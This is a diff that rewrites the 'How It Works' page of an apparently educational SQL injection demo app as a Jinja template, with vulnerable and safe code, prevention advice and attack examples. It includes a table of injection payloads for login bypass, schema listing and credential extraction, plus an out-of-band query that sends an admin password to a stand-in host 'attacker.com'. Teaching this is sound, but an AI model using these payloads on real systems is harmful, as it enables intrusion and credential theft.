@@ -1,56 +1,362 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>How SQL Injection Works - SQL Injection Demo</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.0/css/bootstrap.min.css">
-</head>
-<body>
-    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
-        <div class="container">
-            <a class="navbar-brand" href="/">SQL Injection Demo</a>
-            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
-                <span class="navbar-toggler-icon"></span>
-            </button>
-            <div class="collapse navbar-collapse" id="navbarNav">
-                <ul class="navbar-nav">
-                    <li class="nav-item">
-                        <a class="nav-link" href="/">Home</a>
-                    </li>
-                    <li class="nav-item">
-                        <a class="nav-link" href="/login">Vulnerable Login</a>
-                    </li>
-                    <li class="nav-item">
-                        <a class="nav-link" href="/login_safe">Safe Login</a>
-                    </li>
-                    <!-- <li class="nav-item"> -->
-                    <!--     <a class="nav-link" href="/products">Products Search</a> -->
-                    <!-- </li> -->
-                    <li class="nav-item">
-                        <a class="nav-link active" href="/how-it-works">How It Works</a>
-                    </li>
-                </ul>
+{% extends "base.html" %}
+
+{% block title %}{{ g.get_text('how_it_works') }} - {{ g.get_text('app_name') }}{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-3">
+        <div class="sidebar-nav">
+            <div class="card">
+                <div class="card-header bg-primary text-white">
+                    <h5 class="mb-0">{{ g.get_text('detailed_explanation') }}</h5>
+                </div>
+                <div class="card-body p-0">
+                    <div class="list-group list-group-flush">
+                        <a href="#understanding" class="list-group-item list-group-item-action">{{ g.get_text('understanding_sql_injection') }}</a>
+                        <a href="#techniques" class="list-group-item list-group-item-action">{{ g.get_text('common_techniques') }}</a>
+                        <a href="#prevention" class="list-group-item list-group-item-action">{{ g.get_text('prevention') }}</a>
+                        <a href="#vulnerability-types" class="list-group-item list-group-item-action">{{ g.get_text('vulnerability_types') }}</a>
+                        <a href="#payloads" class="list-group-item list-group-item-action">{{ g.get_text('payload_examples') }}</a>
+                    </div>
+                </div>
             </div>
         </div>
-    </nav>
-
-    <div class="container mt-4">
+    </div>
+    
+    <div class="col-md-9">
         <div class="card">
             <div class="card-header bg-primary text-white">
-                <h5 class="mb-0">How SQL Injection Works</h5>
+                <h5 class="mb-0">{{ g.get_text('how_it_works') }}</h5>
             </div>
             <div class="card-body">
-                <h2>Understanding SQL Injection</h2>
-                <p>SQL Injection is a code injection technique that exploits security vulnerabilities in an application's software by inserting malicious SQL statements into entry fields for execution.</p>
+                <section id="understanding">
+                    <h2>{{ g.get_text('understanding_sql_injection') }}</h2>
+                    <p>{{ g.get_text('sql_injection_description') }}</p>
+                    
+                    <div class="alert alert-warning mt-3">
+                        <i class="fas fa-exclamation-triangle"></i> SQL Injection remains one of the OWASP Top 10 web application security risks.
+                    </div>
+                    
+                    <p>When an application builds SQL queries by concatenating user input directly into SQL statements, it creates an opportunity for attackers to manipulate the query's logic. This happens when input validation or proper escaping is not implemented.</p>
+                    
+                    <div class="card mb-4">
+                        <div class="card-header bg-danger text-white">
+                            <h5 class="mb-0">Vulnerable Code Example</h5>
+                        </div>
+                        <div class="card-body">
+                            <pre class="sql-code"><code>// Vulnerable PHP example
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="card mb-4">
+                        <div class="card-header bg-success text-white">
+                            <h5 class="mb-0">Safe Code Example</h5>
+                        </div>
+                        <div class="card-body">
+                            <pre class="sql-code"><code>// Safe PHP example with prepared statements
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$username, $password]);</code></pre>
+                        </div>
+                    </div>
+                </section>
                 
-                <h3 class="mt-4">Common SQL Injection Techniques</h3>
-                <div class="row">
-                    <div class="col-md-6">
-                        <div class="card mb-3">
-                            <div class="card-header bg-danger">Authentication Bypass</div>
-                            <div class="card-body">
-                                <h5>Example: <code>' OR '1'='1</code></h5>
-                                <p>When this is injected into a login form:</p>
-                                <pre><code>SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'</code></pre>
-                                <p>The <code>OR '1'='1'</code> always evaluates to true, causing the query
+                <hr>
+                
+                <section id="techniques" class="mt-4">
+                    <h3>{{ g.get_text('common_techniques') }}</h3>
+                    
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card mb-3 attack-technique">
+                                <div class="card-header bg-danger">{{ g.get_text('auth_bypass') }}</div>
+                                <div class="card-body">
+                                    <h5>{{ g.get_text('example') }} <code>' OR '1'='1</code></h5>
+                                    <p>{{ g.get_text('example_explanation') }}</p>
+                                    <pre class="sql-code"><code>SELECT * FROM users 
+WHERE username = '' OR '1'='1' 
+AND password = 'anything'</code></pre>
+                                    <p>{{ g.get_text('or_true_explanation') }}</p>
+                                    
+                                    <div class="result-display">
+                                        <strong>Result:</strong> Authentication bypassed, logged in as the first user in the database (often an admin).
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-6">
+                            <div class="card mb-3 attack-technique">
+                                <div class="card-header bg-danger">{{ g.get_text('union_attack') }}</div>
+                                <div class="card-body">
+                                    <h5>{{ g.get_text('example') }} <code>{{ g.get_text('union_example') }}</code></h5>
+                                    <p>{{ g.get_text('union_explanation') }}</p>
+                                    <pre class="sql-code"><code>SELECT name, description FROM products 
+WHERE id = 1 
+UNION SELECT username, password FROM users--</code></pre>
+                                    <p>{{ g.get_text('union_result') }}</p>
+                                    
+                                    <div class="result-display">
+                                        <strong>Result:</strong> Reveals usernames and passwords from the users table.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card mb-3 attack-technique">
+                                <div class="card-header bg-danger">{{ g.get_text('blind_injection') }}</div>
+                                <div class="card-body">
+                                    <h5>{{ g.get_text('example') }} <code>{{ g.get_text('blind_example') }}</code></h5>
+                                    <p>{{ g.get_text('blind_explanation') }}</p>
+                                    <pre class="sql-code"><code>SELECT * FROM products 
+WHERE id = 1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1) = 'a'</code></pre>
+                                    <p>{{ g.get_text('blind_result') }}</p>
+                                    
+                                    <div class="result-display">
+                                        <strong>Result:</strong> By systematically testing each character, an attacker can extract data even without seeing error messages.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-6">
+                            <div class="card mb-3 attack-technique">
+                                <div class="card-header bg-danger">Time-Based Blind Injection</div>
+                                <div class="card-body">
+                                    <h5>{{ g.get_text('example') }} <code>' OR (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END from users)--</code></h5>
+                                    <p>Uses time delays to extract information:</p>
+                                    <pre class="sql-code"><code>SELECT * FROM products WHERE id = '1' OR 
+(SELECT CASE WHEN (username='admin') 
+  THEN pg_sleep(5) 
+  ELSE pg_sleep(0) END 
+FROM users)--</code></pre>
+                                    
+                                    <div class="result-display">
+                                        <strong>Result:</strong> If the query takes 5 seconds, the condition is true; if immediate, it's false.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <hr>
+                
+                <section id="prevention" class="mt-4">
+                    <h3>{{ g.get_text('prevention') }}</h3>
+                    
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card mb-3">
+                                <div class="card-header bg-success">{{ g.get_text('param_queries') }}</div>
+                                <div class="card-body">
+                                    <p>{{ g.get_text('param_explanation') }}</p>
+                                    <pre class="sql-code"><code>// Python example
+cursor.execute(
+    "SELECT * FROM users WHERE username = ? AND password = ?", 
+    (username, password)
+)</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-6">
+                            <div class="card mb-3">
+                                <div class="card-header bg-success">{{ g.get_text('input_validation') }}</div>
+                                <div class="card-body">
+                                    <p>{{ g.get_text('validation_explanation') }}</p>
+                                    <pre class="sql-code"><code>// JavaScript example
+function validateInput(input) {
+  return /^[a-zA-Z0-9_]+$/.test(input);
+}
+
+if (!validateInput(username)) {
+  return "Invalid characters in username";
+}</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card mb-3">
+                                <div class="card-header bg-success">{{ g.get_text('least_privilege') }}</div>
+                                <div class="card-body">
+                                    <p>{{ g.get_text('privilege_explanation') }}</p>
+                                    <pre class="sql-code"><code>-- SQL example
+CREATE USER 'app_user'@'localhost' 
+  IDENTIFIED BY 'password';
+GRANT SELECT, INSERT 
+  ON app_db.products 
+  TO 'app_user'@'localhost';</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-6">
+                            <div class="card mb-3">
+                                <div class="card-header bg-success">{{ g.get_text('orm') }}</div>
+                                <div class="card-body">
+                                    <p>{{ g.get_text('orm_explanation') }}</p>
+                                    <pre class="sql-code"><code>// Python SQLAlchemy example
+user = session.query(User).filter(
+    User.username == username,
+    User.password == password
+).first()</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <hr>
+                
+                <section id="vulnerability-types" class="mt-4">
+                    <h3>{{ g.get_text('vulnerability_types') }}</h3>
+                    
+                    <div class="accordion" id="vulnerabilityTypes">
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="errorBasedHeading">
+                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#errorBasedCollapse" aria-expanded="true" aria-controls="errorBasedCollapse">
+                                    {{ g.get_text('error_based') }}
+                                </button>
+                            </h2>
+                            <div id="errorBasedCollapse" class="accordion-collapse collapse show" aria-labelledby="errorBasedHeading" data-bs-parent="#vulnerabilityTypes">
+                                <div class="accordion-body">
+                                    <p>Error-based SQL injection exploits error messages returned by the database server to extract information. By crafting queries that cause errors containing sensitive data, attackers can learn about the database structure.</p>
+                                    <pre class="sql-code"><code>SELECT * FROM products WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))</code></pre>
+                                    <p>This might return an error like: <span class="text-danger">XPATH syntax error: '~MySQL 8.0.26~'</span>, revealing the database version.</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="timeBasedHeading">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#timeBasedCollapse" aria-expanded="false" aria-controls="timeBasedCollapse">
+                                    {{ g.get_text('time_based') }}
+                                </button>
+                            </h2>
+                            <div id="timeBasedCollapse" class="accordion-collapse collapse" aria-labelledby="timeBasedHeading" data-bs-parent="#vulnerabilityTypes">
+                                <div class="accordion-body">
+                                    <p>Time-based SQL injection uses timing differences to extract data. By making the database sleep if a condition is true, attackers can infer information based on response time.</p>
+                                    <pre class="sql-code"><code>SELECT * FROM products WHERE id = 1; 
+IF (SELECT COUNT(*) FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'a') > 0 
+WAITFOR DELAY '0:0:5'--</code></pre>
+                                    <p>If the response takes 5 seconds, the first character of the admin's password is 'a'.</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="outOfBandHeading">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#outOfBandCollapse" aria-expanded="false" aria-controls="outOfBandCollapse">
+                                    {{ g.get_text('out_of_band') }}
+                                </button>
+                            </h2>
+                            <div id="outOfBandCollapse" class="accordion-collapse collapse" aria-labelledby="outOfBandHeading" data-bs-parent="#vulnerabilityTypes">
+                                <div class="accordion-body">
+                                    <p>Out-of-band SQL injection extracts data through alternative channels when the application doesn't display query results directly.</p>
+                                    <pre class="sql-code"><code>SELECT LOAD_FILE(CONCAT('\\\\', 
+  (SELECT password FROM users WHERE username='admin'), 
+  '.attacker.com\\share\\a'))</code></pre>
+                                    <p>This attempts to load a file from a remote server, sending the admin password as part of the DNS lookup.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <hr>
+                
+                <section id="payloads" class="mt-4">
+                    <h3>{{ g.get_text('payload_examples') }}</h3>
+                    
+                    <div class="table-responsive">
+                        <table class="table table-striped">
+                            <thead>
+                                <tr>
+                                    <th>Purpose</th>
+                                    <th>Payload</th>
+                                    <th>Description</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Basic Authentication Bypass</td>
+                                    <td><code>' OR 1=1--</code></td>
+                                    <td>Simplest form of SQL injection that bypasses login forms</td>
+                                </tr>
+                                <tr>
+                                    <td>Admin Bypass</td>
+                                    <td><code>admin'--</code></td>
+                                    <td>Targets admin accounts by using their username and commenting out the password check</td>
+                                </tr>
+                                <tr>
+                                    <td>Database Version</td>
+                                    <td><code>' UNION SELECT version()--</code></td>
+                                    <td>Retrieves the database version information</td>
+                                </tr>
+                                <tr>
+                                    <td>List Tables</td>
+                                    <td><code>' UNION SELECT table_name FROM information_schema.tables--</code></td>
+                                    <td>Retrieves a list of tables in the database</td>
+                                </tr>
+                                <tr>
+                                    <td>List Columns</td>
+                                    <td><code>' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--</code></td>
+                                    <td>Retrieves a list of columns in the users table</td>
+                                </tr>
+                                <tr>
+                                    <td>Data Extraction</td>
+                                    <td><code>' UNION SELECT username,password FROM users--</code></td>
+                                    <td>Extracts username and password data from the users table</td>
+                                </tr>
+                                <tr>
+                                    <td>Blind Injection Test</td>
+                                    <td><code>' OR (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)=97--</code></td>
+                                    <td>Tests if the first character of the username for user with id=1 is 'a' (ASCII 97)</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    // Add scroll spy for the sidebar
+    document.addEventListener('DOMContentLoaded', function() {
+        const sections = document.querySelectorAll('section[id]');
+        const navLinks = document.querySelectorAll('.sidebar-nav a');
+        
+        window.addEventListener('scroll', function() {
+            let current = '';
+            
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                const sectionHeight = section.clientHeight;
+                if (pageYOffset >= (sectionTop - 200)) {
+                    current = section.getAttribute('id');
+                }
+            });
+            
+            navLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href').substring(1) === current) {
+                    link.classList.add('active');
+                }
+            });
+        });
+    });
+</script>
+{% endblock %}
